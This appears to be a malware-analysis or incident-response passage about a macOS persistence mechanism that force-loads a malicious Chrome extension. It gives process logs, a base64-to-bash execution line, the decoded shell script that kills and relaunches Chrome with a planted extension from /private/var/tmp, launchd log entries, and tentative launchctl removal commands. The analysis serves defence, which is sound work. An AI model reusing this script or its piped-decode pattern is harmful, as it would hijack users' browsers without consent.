...
Process activity
```
username@computername	xpcproxy	21344	xpcproxy com.chrome.extension
username@computername	xpcproxy	17800	xpcproxy com.chrome.extensionsPop
```
...
username@computername	bash	21344	sh -c echo  | base64 --decode | bash

Base64 Decoded:

if ps ax | grep -v grep | grep 'Google Chrome' &> /dev/null; then echo running;  EXTENSION_SERVICE='Google Chrome --load-extension'; if ps ax | grep -v grep | grep 'Google Chrome --load-extension' &> /dev/null; then echo e running; else   pkill -a -i 'Google Chrome'; sleep 1 ;  open -a 'Google Chrome' --args --load-extension='/private/var/tmp/372FF9AF-1806-41A3-B661-44DD9BEF8D3C' --restore-last-session --noerrdialogs --disable-session-crashed-bubble; fi;  else echo not running; fi

Execution attempt 2:

username@computername	sh	21344	sh -c echo  | base64 --decode | bash
...
System Log Entries
```
Jun 01 00:13:04 computername com.apple.xpc.launchd[1] (com.chrome.extension): Enabling Probabilistic Guard Malloc for process: com.chrome.extension
Jun 01 00:13:04 computername com.apple.xpc.launchd[1] (com.chrome.extension[75961]): Probabilistic Guard Malloc-enabled process exited: com.chrome.extension
Jun 01 00:23:48 computername com.apple.xpc.launchd[1] (com.chrome.extensionsPop[77157]): Service exited with abnormal code: 137
Jun 01 01:23:48 computername com.apple.xpc.launchd[1] (com.chrome.extensionsPop[83851]): Service exited with abnormal code: 137
Jun 01 01:24:25 computername com.apple.xpc.launchd[1] (com.chrome.extensions[83921]): Service exited with abnormal code: 137
Jun 01 02:23:48 computername com.apple.xpc.launchd[1] (com.chrome.extensionsPop[90533]): Service exited with abnormal code: 137
Jun 01 03:23:48 computername com.apple.xpc.launchd[1] (com.chrome.extensionsPop[97199]): Service exited with abnormal code: 137
Jun 01 03:53:45 computername com.apple.xpc.launchd[1] (com.chrome.extension): Enabling Probabilistic Guard Malloc for process: com.chrome.extension
Jun 01 03:53:45 computername com.apple.xpc.launchd[1] (com.chrome.extension[985]): Probabilistic Guard Malloc-enabled process exited: com.chrome.extension
Jun 01 04:23:48 computername com.apple.xpc.launchd[1] (com.chrome.extensionsPop[4420]): Service exited with abnormal code: 137
Jun 01 05:23:48 computername com.apple.xpc.launchd[1] (com.chrome.extensionsPop[11108]): Service exited with abnormal code: 137
Jun 01 06:23:48 computername com.apple.xpc.launchd[1] (com.chrome.extensionsPop[17800]): Service exited with abnormal code: 137
Jun 01 07:23:48 computername com.apple.xpc.launchd[1] (com.chrome.extensionsPop[29612]): Service exited with abnormal code: 137
Jun 01 07:24:27 computername com.apple.xpc.launchd[1] (com.chrome.extensions[29691]): Service exited with abnormal code: 137
Jun 01 08:23:48 computername com.apple.xpc.launchd[1] (com.chrome.extensionsPop[43866]): Service exited with abnormal code: 137
```

### Experimental** (still in testing phase) unloading the malicious Chrome Extension

```
launchctl unload com.chrome.extension
launchctl unload com.chrome.extensionsPop
